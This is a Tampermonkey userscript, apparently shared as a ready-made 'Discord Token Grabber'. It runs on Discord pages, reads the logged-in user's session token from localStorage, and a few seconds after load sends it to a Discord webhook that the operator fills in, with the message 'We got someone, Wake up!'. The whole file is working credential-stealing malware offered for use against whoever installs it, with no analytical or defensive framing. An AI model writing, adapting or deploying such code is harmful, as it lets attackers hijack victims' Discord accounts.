// ==UserScript==
// @name         Get Discord Token to a discord webhook.
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Allows you to retrieve discord token on a discord webhook.
// @author       0xyg3n
// @match        https://discordapp.com/activ*
// @match        https://discordapp.com/channel*
// @match        https://discord.com/activ*
// @match        https://discord.com/channel*
// @grant        none
// @run-at       document-start
// ==/UserScript==

//special thanks to iHavoc101#6156

(function () {
    'use strict';
 
    // implement localstorage behavior using cookie
    //---------------------------------------------
    if(!window.localStorage) {
       Object.defineProperty(window, "localStorage", new(function () {
          var aKeys = [],
             oStorage = {};
          Object.defineProperty(oStorage, "getItem", {
             value: function (sKey) {
                return this[sKey] ? this[sKey] : null;
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "key", {
             value: function (nKeyId) {
                return aKeys[nKeyId];
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "setItem", {
             value: function (sKey, sValue) {
                if(!sKey) {
                   return;
                }
                document.cookie = escape(sKey) + "=" + escape(sValue) + "; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/";
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "length", {
             get: function () {
                return aKeys.length;
             },
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "removeItem", {
             value: function (sKey) {
                if(!sKey) {
                   return;
                }
                document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          Object.defineProperty(oStorage, "clear", {
             value: function () {
                if(!aKeys.length) {
                   return;
                }
                for(var sKey in aKeys) {
                   document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
                }
             },
             writable: false,
             configurable: false,
             enumerable: false
          });
          this.get = function () {
             var iThisIndx;
             for(var sKey in oStorage) {
                iThisIndx = aKeys.indexOf(sKey);
                if(iThisIndx === -1) {
                   oStorage.setItem(sKey, oStorage[sKey]);
                } else {
                   aKeys.splice(iThisIndx, 1);
                }
                delete oStorage[sKey];
             }
             for(aKeys; aKeys.length > 0; aKeys.splice(0, 1)) {
                oStorage.removeItem(aKeys[0]);
             }
             for(var aCouple, iKey, nIdx = 0, aCouples = document.cookie.split(/\s*;\s*/); nIdx < aCouples.length; nIdx++) {
                aCouple = aCouples[nIdx].split(/\s*=\s*/);
                if(aCouple.length > 1) {
                   oStorage[iKey = unescape(aCouple[0])] = unescape(aCouple[1]);
                   aKeys.push(iKey);
                }
             }
             return oStorage;
          };
          this.configurable = false;
          this.enumerable = true;
       })());
    }
    //---------------------------------------------------
    
    function dmdisc(message) {
        let webhookurl = ""; //put your webhook url here.
        let request = new XMLHttpRequest();
        request.open("POST", webhookurl);

        request.setRequestHeader('Content-type', 'application/json');

        let params = {
        username: ".:Discord Token Grabber 1.0:.",
        avatar_url: "https://i.imgur.com/nU9WM3V.jpg",
        content: '**We got someone, Wake up!\nToken: '+message+'**'
        }

        request.send(JSON.stringify(params));
    }

    var userToken = localStorage.getItem('token');
 
    document.addEventListener('readystatechange', event => {
       if(event.target.readyState === "interactive") {} else if(event.target.readyState === "complete") {
          setTimeout(function () {
             setTimeout(function () {dmdisc(userToken);},1000); 
          }, 3000);
       }
    });
 })();